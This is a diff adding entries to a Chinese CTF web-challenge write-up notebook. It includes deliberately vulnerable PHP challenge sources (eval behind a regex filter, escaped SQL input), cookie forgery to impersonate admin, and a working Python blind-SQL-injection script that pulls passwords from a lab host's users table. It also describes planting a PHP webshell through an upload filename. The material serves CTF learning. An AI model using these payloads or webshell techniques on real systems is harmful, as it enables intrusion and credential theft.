@@ -6002,3 +6002,201 @@ echo dechange($s);
 ~~~
 
 ![image-20210610145451388](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210610145451388.png)
+
+### [极客大挑战 2019]RCE ME
+
+~~~php
+<?php
+error_reporting(0);
+if(isset($_GET['code'])){
+    $code=$_GET['code'];
+    if(strlen($code)>40){
+        die("This is too Long.");
+    }
+    if(preg_match("/[A-Za-z0-9]+/",$code)){  //重点是绕过这个限制
+        die("NO.");
+    }
+    @eval($code);
+}
+else{
+    highlight_file(__FILE__);
+}
+
+// ?>
+
+~~~
+
+ **取反绕过正则匹配** https://blog.csdn.net/qq_45691294/article/details/109402769
+
+ **URL编码取反绕过**
+
+![image-20210610214743519](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210610214743519.png)
+
+**异或绕过**
+
+**递增递减运算符绕过**
+
+### [GWCTF 2019]枯燥的抽奖
+
+
+
+### [BSidesCF 2019]Kookie
+
+![image-20210611125348977](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210611125348977.png)
+
+使用用户名：cookie 密码：monster成功登录
+
+![image-20210611125448671](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210611125448671.png)
+
+但是是以cookie登录的，页面要求使用admin登录。所以抓包
+
+![image-20210611125535299](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210611125535299.png)
+
+抓包发现了set-cookie中存在username字段，于是在数据包请求头添加了一个字段： `username=admin`
+
+成功获得flag
+
+![image-20210611125705017](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210611125705017.png)
+
+### [CISCN2019 总决赛 Day2 Web1]Easyweb
+
+![image-20210615160457431](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210615160457431.png)
+
+
+
+
+
+![image-20210615160511256](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210615160511256.png)
+
+
+
+
+
+![image-20210615160535082](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210615160535082.png)
+
+
+
+
+
+![image-20210615160557512](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210615160557512.png)
+
+~~~php
+//image.php.bak
+
+<?php
+include "config.php";
+
+$id=isset($_GET["id"])?$_GET["id"]:"1";
+$path=isset($_GET["path"])?$_GET["path"]:"";
+
+$id=addslashes($id);
+$path=addslashes($path);
+
+$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
+$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
+
+$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
+$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
+
+$path="./" . $row["path"];
+header("Content-Type: image/jpeg");
+readfile($path);
+~~~
+
+
+
+payload:
+
+~~~python
+import  requests
+url = "http://5eb44461-67e7-42ed-ad52-9c3bba79884a.node3.buuoj.cn/image.php?id=\\0&path="
+payload = "or id=if(ascii(substr((select password from users),{0},1))>{1},1,0)%23"
+result = ""
+for i in range(1,100):
+    l = 1
+    r = 130
+    mid = (l + r)>>1
+    while(l<r):
+        payloads = payload.format(i,mid)
+        print(url+payloads)
+        html = requests.get(url+payloads)
+        if "JFIF" in html.text:
+            l = mid +1
+        else:
+            r = mid
+        mid = (l + r)>>1
+    result+=chr(mid)
+    print(result)
+
+
+~~~
+
+![image-20210615164347563](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210615164347563.png)
+
+![image-20210615164410697](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210615164410697.png)
+
+不能上传php文件，解决办法：
+
+![image-20210615165244565](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210615165244565.png)
+
+
+
+好像上面不行，打开页面是个PHP文件，内容是用户上传了一个名称XXX的文件，所有我们要把一句话木马写在文件名字中
+
+![image-20210615165853585](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210615165853585.png)
+
+用蚁剑连接成功即可
+
+![image-20210615165924562](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210615165924562.png)
+
+### [FBCTF2019]RCEService（。。。。）
+
+
+
+### [Zer0pts2020]Can you guess it?
+
+~~~~php+HTML
+ <?php
+include 'config.php'; // FLAG is defined in config.php
+
+if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+  exit("I don't know what you are thinking, but I won't let you read it :)");
+}
+
+if (isset($_GET['source'])) {
+  highlight_file(basename($_SERVER['PHP_SELF']));
+  exit();
+}
+
+$secret = bin2hex(random_bytes(64));
+if (isset($_POST['guess'])) {
+  $guess = (string) $_POST['guess'];
+  if (hash_equals($secret, $guess)) {
+    $message = 'Congratulations! The flag is: ' . FLAG;
+  } else {
+    $message = 'Wrong.';
+  }
+}
+?>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Can you guess it?</title>
+  </head>
+  <body>
+    <h1>Can you guess it?</h1>
+    <p>If your guess is correct, I'll give you the flag.</p>
+    <p><a href="?source">Source</a></p>
+    <hr>
+<?php if (isset($message)) { ?>
+    <p><?= $message ?></p>
+<?php } ?>
+    <form action="index.php" method="POST">
+      <input type="text" name="guess">
+      <input type="submit">
+    </form>
+  </body>
+</html> 
+~~~~
+
